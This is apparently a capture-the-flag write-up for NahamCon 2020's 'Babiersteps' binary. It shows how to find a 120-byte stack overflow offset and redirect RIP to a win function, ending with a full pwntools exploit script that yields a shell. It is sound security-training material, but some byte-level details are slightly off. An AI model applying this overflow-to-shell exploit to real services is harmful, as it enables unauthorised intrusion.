This is my writeup for the "Babiersteps" challange from NahamCon 2020.

After downloading the babier file we run the ```file ./babiersteps``` command wich gives the folowing output:

![alt text](images/file.png?raw=true "File")

We can see that the barbier file is a 64 bit elf file.

When we run a obj dump (```objdump ./babiersteps -d```). we can see that the program contains a win function at address ```0x4011c9.```

![alt text](images/segfault.png?raw=true "win")


After making the file executable and running we are shown the text "Everyone has heard of gets, but have you heard of scanf?".
If we input some random characters the program wil seemingly do nothing and shut down. If we give the program an input thats over 120 bytes the progrem wil return a segment fault.

![alt text](images/segfault.png?raw=true "seg")

If we open the program in gdb can get a better look at what is going on. ```gdb ./babiersteps``` (Note: I am using geff extention for gdb).
When we imput a lot of A's (300) we can see that we clotter most of the stack but not the RIP (instruction pointer) wich we want to control and point to our win function.

![alt text](images/clotter.png?raw=true "clotter")

Because the file is a 64 bit elf the RIP address has to be a 48 bit canonical address wich means the address has to be in the range ```0x0000000000000000``` to ```0x00007FFFFFFFFFFF``` and ```0xFFFF800000000000``` to ```0xFFFFFFFFFFFFFFFF```. otherwise the address wont be able to clutter the RIP. If we input a bunch of A's we are overwriting the rip with a non-canonical address. If we however run the program with 120 A's up to the point of getting the segfault(offset) and add a 6 bytes canonial address of 6 B's ```0x0000424242424242``` to the end we can see we can control the RIP.

![alt text](images/control.png?raw=true "control")

Now all we have to do is point the address to our win function and hope we get the flag. Our win function was located at ```0x4011c9.```.
We can use pyton to give us the addres in little endian ```python3 -c 'import struct;print(struct.pack("<I",0x4011c9))'```. We then need to add \x00\ 5 times to make the address canonical. If we input this address after our offset we can point to the win function.

I made a little python script using pwn tools to handle the program localy or remotly.

```
import argparse
from pwn import *
import struct;

offset = b"A"*120
rip = b"\xc9\x11@\x00\x00\x00\x00\x00\x00"

payload = b"".join([offset,rip]) 

parser = argparse.ArgumentParser()
parser.add_argument(
        '--host',
        type=str,
        help='The host name or IP address to connect to'
        )
parser.add_argument(
        '--port',
        type=int,
        help='The port for the service to connect to'
        )
parser.add_argument(
        '--file',
        type=str,
        help='Elf file to exploit'
        )

args = parser.parse_args()

if args.host and args.port:
        p = remote(args.host, args.port)

elif args.file and not(args.host) and not(args.port):
        elf = ELF(args.file)
        libc = elf.libc
        p=process(elf.path)

else:
        print("No arguments supplied")
        exit()


p.recvuntil('?')
p.sendline(payload)
p.interactive()
```

If we run this program localy (```python3 payload.py --file ./babiersteps```) we can see that the win function spawned a shell for us and we can cat out the flag.

![alt text](images/flag.png?raw=true "flag")

Thanks for reading, Suggestions & Feedback are appreciated !